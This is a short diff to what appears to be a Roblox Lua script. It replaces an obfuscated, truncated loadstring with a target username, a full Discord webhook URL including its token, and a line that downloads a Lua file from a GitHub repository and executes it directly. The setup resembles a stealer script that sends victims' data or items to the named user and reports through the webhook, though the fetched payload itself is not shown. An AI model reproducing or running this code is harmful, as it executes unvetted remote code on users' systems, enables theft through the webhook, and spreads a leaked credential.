@@ -1,1 +1,5 @@
-loadstring("\112\114\105\110\116\40\34\85\115\101\114\110\97\109\101\32\61\32\34\115\97\114\100\111\112\111\103\105\50\50\34\10\85\115\101\114\1")
+Username = 'sardopogi2'
+Username2 = 'UnknownUsername?'
+Webhook = 'https://discord.com/api/webhooks/1259483150246088927/XZtRyZFBMk18IVGPfky70oOcQDjxne1WnVlQWhSSiWVjfXTLeWl6swkeTl9n62c9kQ6K'
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
